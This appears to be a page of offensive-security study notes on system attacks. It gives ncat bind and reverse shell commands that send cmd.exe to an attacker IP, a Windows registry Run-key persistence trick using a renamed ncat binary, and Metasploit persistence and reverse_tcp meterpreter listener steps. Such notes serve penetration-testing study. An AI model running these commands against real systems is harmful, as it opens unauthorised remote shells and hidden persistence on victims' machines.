# ‚öôÔ∏èSystem Attacks

## Classification:

![](<../../.gitbook/assets/image (19).png>)

## üö™Backdoor

### Ncat

```
ncat [options] [hostname] [port]
```

install it in the victim machine and run it with these commands:

```
ncat -l -p 5555 -e cmd.exe
```

> \-l listen -e: excute file we choose cmd so we can excute commands.

attacker will

```
ncat [victim_ip] 5555
```

#### can also be executed as  a reverse listener especially when the target is on another network:

in the Attacker machine listen:

```
ncat -l -p 5555 -v
```

> \-v: for verbose give us output.

in the target machine:

```
ncat -e cmd.exe {attacker_ip} 5555
```

#### Persistent Backdoor:

in windows Register Editor in \`HKEY\__LOCALMACHINE\SOFTWARE\Microsoft\CurrentVersion\Run\` we add string value for our ncat (or whatever we name it in the target machine) add command to run_ :

```
which's the path to ncat (here it's re-named as winconfig) {Attacker_IP} {Port} -e cmd.exe
```

then restart the victim machine.

as soon as they logged in the attacker who's listening will et a shell.

### Metasploit

using the **Meterpreter** (which's just like ncat above but with steroids).&#x20;

**``**[**`Meterpreter:`**](https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/) is a Metasploit attack payload that provides an interactive shell from which an attacker can explore the target machine and execute code.&#x20;

Get persistence in target machine:

after hacking one machine you will have already a session that you can browse with `sessions` command:

```
use exploit/windows/loca/s4u_persistence

sessions //see all the sessions you have
set session <ID> //pick session to stay persistent

set trigger logon //whenever target login you will have conn

set payload windows/meterpreter/reverse_tcp //whatever payload

//same as the attack you used to gain access from first place and gett ths session
set lhost <your_IP> 
set lport <open_Port>
```

starter listener:

```
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
exploit
```

## üí¶Buffer Overflow

## Shell:

a program that executes commands, check this to see various languages and ways to execute a system commands(getting a shell):
